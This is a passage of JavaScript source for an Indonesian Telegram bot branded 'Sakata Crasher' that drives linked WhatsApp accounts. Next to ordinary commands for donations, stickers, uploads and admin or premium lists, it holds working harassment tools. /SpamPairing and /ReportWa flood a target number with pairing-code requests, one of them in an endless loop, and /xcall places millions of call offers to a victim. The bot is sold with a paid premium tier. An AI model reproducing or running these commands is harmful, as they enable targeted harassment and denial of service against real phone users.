4. Kasih hasilnya pake format \`\`\`(bahasa pemograman) di awal dan \`\`\` di akhir.

Ini kodenya bre:

${code}
`;

    const url = `https://api.fasturl.link/aillm/gpt-4o?ask=${encodeURIComponent(prompt)}`;
    const response = await fetch(url);
    const data = await response.json();

    if (data?.result) {
      let result = data.result.trim();

      if (!result.includes("```")) {
        result = `\`\`\`javascript\n${result}\n\`\`\``;
      }

      if (result.length > 4000) {
        result = result.slice(0, 4000) + "...";
      }

      return bot.sendMessage(chatId, result, {
        parse_mode: "Markdown"
      });
    } else {
      bot.sendMessage(chatId, "❌ Gagal dapet balasan dari AI bre.");
    }
  } catch (err) {
    console.error("FixCode Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi error pas proses perbaikan kode.");
  }
});

bot.onText(/\/donate/, async (msg) => {
  const chatId = msg.chat.id;

  const caption = `
<pre>  
╭───❏ *DONASI DUKUNG BOT XTV*
│🙏 Terima kasih udah mau support sakata!
│💸 Scan QRIS di bawah untuk donasi.
│💸 No Dana : 0815-4582-0428
│💸 No Gopay : 0815-4582-0428
│
│📍 Donasi akan digunakan untuk:
│- Biaya Update Sakata
│- Pengembangan fitur
│- Biaya Buat Server Apk
╰❏
</pre>`;

  try {
    await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/23upqv.jpg",
      {
        caption: caption,
        parse_mode: "Markdown"
      }
    );
  } catch (err) {
    console.error("❌ Gagal kirim QRIS:", err.message);
    bot.sendMessage(chatId, "❌ Gagal kirim QRIS donasi bre.");
  }
});

bot.onText(/\/bisakah(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, 'Contoh: /bisakah aku jadian sama dia?');
  }

  const jawab = pickRandom([
    'Iya',
    'Bisa',
    'Tentu saja bisa',
    'Tentu bisa',
    'Sudah pasti',
    'Sudah pasti bisa',
    'Tidak',
    'Tidak bisa',
    'Tentu tidak',
    'Tentu tidak bisa',
    'Sudah pasti tidak'
  ]);

  bot.sendMessage(
    chatId,
    `*🌎Pertanyaan:* bisakah ${text}\n*💬Jawaban:* ${jawab}`,
    { parse_mode: 'Markdown' }
  );
});

// random function
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}

/* ================= CLEAN ================= */
function cleanCode(code) {
  return code
    .replace(/\r/g, "")
    .replace(/\t/g, "  ")
    .replace(/\u0000/g, "");
}

/* ================= SIMPLE PARSE ================= */
function safeParse(code) {
  try {
    new Function(code);
    return { ok: true };
  } catch (error) {
    return { ok: false, error };
  }
}

/* ================= SIMPLE ANALYZE ================= */
function analyzeCode(code) {
  let score = 100;
  let notes = [];

  if (code.includes("eval")) {
    score -= 20;
    notes.push("Hindari eval()");
  }

  if (code.length > 5000) {
    score -= 10;
    notes.push("Kode terlalu panjang");
  }

  let rating = score > 80 ? "Aman" : score > 60 ? "Cukup" : "Bahaya";

  return { score, notes, rating };
}

/* ================= DETECT DANGER ================= */
function detectDanger(code) {
  let warnings = [];

  if (code.includes("while(true)")) {
    warnings.push("⚠️ Infinite loop (while true)");
  }

  if (code.includes("for(;;)")) {
    warnings.push("⚠️ Infinite loop (for kosong)");
  }

  return warnings;
}

/* ================= HIGHLIGHT ERROR ================= */
function highlightError(code, lineNum) {
  const lines = code.split("\n");
  return lines.map((l, i) => {
    if (i + 1 === lineNum) return "👉 " + l;
    return "   " + l;
  }).slice(0, 20).join("\n");
}

/* ================= GET TEXT ================= */
async function getText(msg) {
  if (msg.reply_to_message.text) {
    return msg.reply_to_message.text;
  }
  return "";
}

/* ================= CEKFUNC ================= */
bot.onText(/\/cekfunc/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId, "Reply kode / file.");
    }

    let text = await getText(msg);
    if (!text || text.length < 5) {
      return bot.sendMessage(chatId, "Kode terlalu pendek / kosong.");
    }

    text = cleanCode(text);

    const parsed = safeParse(text);

    // ✅ VALID
    if (parsed.ok) {
      const { score, notes, rating } = analyzeCode(text);
      const warnings = detectDanger(text);

      return bot.sendMessage(
        chatId,
        `<pre>
✅ FUNCTION AMAN 🔥

📊 Score: ${score}/100
🏷️ Rating: ${rating}
📝 ${notes.join(" | ") || "Aman"}
${warnings.length ? "\n" + warnings.join("\n") : ""}
</pre>`
      );
    }

    // ❌ ERROR
    const err = parsed.error;
    const line = err.lineNumber || 0;

    const preview = highlightError(text, line);

    return bot.sendMessage(
      chatId,
      `<pre>  ❌ ERROR MAMPUS, JASFIX DM @R4f14ndr4
      
${err.message}
📍 Line ${line}

${preview}
</pre>`
    );

  } catch (e) {
    return bot.sendMessage(chatId, "❌ Terjadi error internal.");
  }
});

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat Apongg');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Selesai Cok..');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;  
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }
    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");      
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });
        
        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });  
             
        await bot.editMessageText(` Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();
    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/xcall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /xcall 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /xcall 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://files.catbox.moe/crk3w7.jpg", {
    caption: `┏━━━━━━〣 Sakata Crasher 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /xcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});


bot.onText(/^\/hapusbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/hapusbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /hapusbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nAPONG TAMVAN¿?"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Sakata😜");l
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/ReportWa (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  if (!isOwner(fromId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const q = match[1];
  if (!q) {
    return bot.sendMessage(
      chatId,
      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /ReportWa 628xxxxxx"
    );
  }

  const target = q.replace(/[^0-9]/g, "").trim();
  const pepec = `${target}@s.whatsapp.net`;

  try {
    const { state } = await useMultiFileAuthState("senzyreport");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
    });

    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);

    while (true) {
      await sleep(1500);
      await sucked.requestPairingCode(target);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `done spam report ke nomor ${pepec} ,,tidak work all nomor ya!!`);
  }
});

//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`js
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`js
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`js
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`js
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error(`bot ${botNum}:`, error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});


bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/^\/update$/, async (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, "🔄 Proses Auto Update");

    try {
        await downloadRepo("");
        bot.sendMessage(chatId, "✅ UPdate Selesai\n🔁 Proses Restart Otomatis.");

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal update, cek repo GitHub atau koneksi.");
        console.error(e);
    }
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); 
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/dellbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`js
╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`js
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`js
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`js
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`js
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});
